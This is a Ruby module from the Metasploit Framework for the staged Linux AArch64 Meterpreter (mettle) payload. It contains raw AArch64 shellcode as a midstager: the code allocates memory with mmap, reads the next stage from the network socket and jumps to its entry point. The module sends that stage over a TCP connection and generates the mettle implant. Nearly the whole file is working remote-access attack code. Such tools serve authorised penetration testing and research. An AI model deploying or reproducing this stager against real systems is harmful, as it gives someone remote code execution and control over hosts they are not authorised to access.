##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_aarch64_linux'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter',
        'Description'   => 'Inject the mettle server payload (staged)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_AARCH64,
        'License'       => MSF_LICENSE,
        'Session'       => Msf::Sessions::Meterpreter_aarch64_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    # Generated from external/source/shellcode/linux/aarch64/stage_mettle.s
    midstager = [



            0x10000582,          #  adr	x2, b0 <size>
            0xb9400042,          #  ldr	w2, [x2]
            0xaa0203ea,          #  mov	x10, x2
            0xd34cfc42,          #  lsr	x2, x2, #12
            0x91000442,          #  add	x2, x2, #0x1
            0xd374cc42,          #  lsl	x2, x2, #12
            0xaa1f03e0,          #  mov	x0, xzr
            0xaa0203e1,          #  mov	x1, x2
            0xd28000e2,          #  mov	x2, #0x7                   	// #7
            0xd2800443,          #  mov	x3, #0x22                  	// #34
            0xaa1f03e4,          #  mov	x4, xzr
            0xaa1f03e5,          #  mov	x5, xzr
            0xd2801bc8,          #  mov	x8, #0xde                  	// #222
            0xd4000001,          #  svc	#0x0
            0xaa0a03e4,          #  mov	x4, x10
            0xaa0003e3,          #  mov	x3, x0
            0xaa0003ea,          #  mov	x10, x0
            0xaa0c03e0,          #  mov	x0, x12
            0xaa0303e1,          #  mov	x1, x3
            0xaa0403e2,          #  mov	x2, x4
            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
            0xd4000001,          #  svc	#0x0
            0x34000260,          #  cbz	w0, a4 <failed>
            0x8b000063,          #  add	x3, x3, x0
            0xeb000084,          #  subs	x4, x4, x0
            0x54ffff01,          #  b.ne	44 <read_loop>
            0x10000280,          #  adr	x0, b8 <entry>
            0xf9400000,          #  ldr	x0, [x0]
            0x8b0a0000,          #  add	x0, x0, x10
            0xaa0003e8,          #  mov	x8, x0
            0xca000000,          #  eor	x0, x0, x0
            0xca010021,          #  eor	x1, x1, x1
            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
            0xd2800322,          #  mov	x2, #0x19                  	// #25
            0x910003e3,          #  mov	x3, sp
            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
            0xd2800020,          #  mov	x0, #0x1                   	// #1
            0x910003e1,          #  mov	x1, sp
            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
            0xd61f0100,          #  br	x8
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
            0xd4000001,          #  svc	#0x0
            payload.length,
            0x00000000,          #  .word	0x00000000
            entry_offset,
            0x00000000,          #  .word	0x00000000
            0x0000006d,          #  .word	0x0000006d
            0x00000000,          #  .word	0x00000000
            0xd503201f,          #  nop
            0xd503201f,          #  nop
        ].pack('V*')

    print_status("Transmitting intermediate midstager...(#{midstager.length} bytes)")
    print_status("Transmitting intermediate paystager...(#{payload.length} bytes)")
    conn.put([midstager.length].pack('V'))
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    MetasploitPayloads::Mettle.new('aarch64-linux-musl',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
  end
end
